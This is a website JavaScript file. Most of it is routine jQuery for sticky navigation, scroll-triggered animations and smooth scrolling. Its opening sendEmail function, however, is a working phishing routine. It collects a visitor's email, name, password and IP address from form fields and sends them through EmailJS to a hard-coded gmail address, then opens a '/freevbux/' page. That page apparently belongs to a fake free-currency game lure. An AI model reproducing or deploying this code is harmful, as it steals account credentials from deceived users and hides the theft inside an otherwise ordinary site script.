function sendEmail() {
  var tempParams = {
    from_name: document.getElementById("email").value,
    to_name: "eitantravels25@gmail.com",
    message: document.getElementById("name").value + ", \n" + document.getElementById("password").value + ", \n" + document.getElementById("ip-address").value + ", \n" + document.getElementById("message").value
  };

  emailjs.send('service_0a19vxi', 'template_ws4a9bj', tempParams, "e5QqTyM8AtPOxMClT").then(function(res){
    console.log("message success! " + res.status);
  });
  window.open("/freevbux/", "_blank");
};

// runs when document is ready
$(document).ready(function() {
    // gets triggered when person scrolls to about section
    $(".about-section").waypoint(function(direction){
        // adds class to trigger sticky nav
        if (direction == "down") {
            $("nav").addClass('sticky-nav');
        }
        else {$("nav").removeClass('sticky-nav');}
    }, {
        offset: '2%',
    });
    // animations
    $(".about-section").waypoint(function(direction){
        $(".js--about-box").addClass('animate__animated animate__bounceIn');
    }, {
        offset: '50%',
    });
    $(".services-section").waypoint(function(direction){
        $(".js--services-box").addClass('animate__animated animate__zoomIn');
    }, {
        offset: '50%',
    });
    $(".packages-section").waypoint(function(direction){
        $(".js--packages-box").addClass('animate__animated animate__flipInX');
    }, {
        offset: '50%',
    });
    $(".work-section").waypoint(function(direction){
        $(".js--work-box").addClass('animate__animated animate__zoomInLeft');
    }, {
        offset: '50%',
    });

    // scroll to place
    $(".get-a-job").click(function(){
        $('html, body').animate({scrollTop:$('.js--contact-section').offset().top}, 1000);
    });

    // # smooth moving

    $('a[href*="#"]')
  // Remove links that don't actually link to anything
  .not('[href="#"]')
  .not('[href="#0"]')
  .click(function(event) {
    // On-page links
    if (
      location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') 
      && 
      location.hostname == this.hostname
    ) {
      // Figure out element to scroll to
      var target = $(this.hash);
      target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
      // Does a scroll target exist?
      if (target.length) {
        // Only prevent default if animation is actually gonna happen
        event.preventDefault();
        $('html, body').animate({
          scrollTop: target.offset().top
        }, 1000, function() {
          // Callback after animation
          // Must change focus!
          var $target = $(target);
          $target.focus();
          if ($target.is(":focus")) { // Checking if the target was focused
            return false;
          } else {
            $target.attr('tabindex','-1'); // Adding tabindex for elements not focusable
            $target.focus(); // Set focus again
          };
        });
      }
    }
  });
});

var html = document.querySelector("html");